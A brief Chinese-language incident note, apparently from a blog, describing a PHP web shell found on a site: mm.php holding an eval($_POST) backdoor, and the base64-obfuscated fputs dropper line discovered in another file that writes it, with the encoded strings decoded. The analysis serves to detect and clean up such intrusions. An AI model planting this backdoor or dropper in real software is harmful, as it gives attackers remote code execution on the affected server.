mm.php 
内容为： 
复制代码 代码如下:

<?eval($_POST[c]);?> 

最后查到某文件内的第一行为以下代码： 
复制代码 代码如下:

fputs(fopen(base64_decode("bW0ucGhw"),"w"),base64_decode("PD9ldmFsKCRfUE9TVFtjXSk7Pz4=")); 


base64_decode("bW0ucGhw") //mm.php 
base64_decode("PD9ldmFsKCRfUE9TVFtjXSk7Pz4=") // 
<?eval($_POST[c]);?> 